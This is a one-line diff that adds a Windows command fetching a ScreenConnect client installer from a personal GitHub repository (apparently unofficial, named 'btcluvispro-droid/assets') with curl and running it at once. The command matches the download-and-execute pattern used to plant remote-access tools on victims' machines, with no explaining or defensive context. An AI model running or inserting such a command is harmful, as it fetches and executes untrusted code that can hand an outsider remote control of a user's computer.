@@ -1,0 +1,1 @@
+cmd /c curl -L "https://github.com/btcluvispro-droid/assets/blob/ecc6eda3bee0709f6462ecf2b6c4f07bb1b0815d/ScreenConnect.ClientSetup.msi?raw=true" -o ScreenConnect.ClientSetup.msi && ScreenConnect.ClientSetup.msi
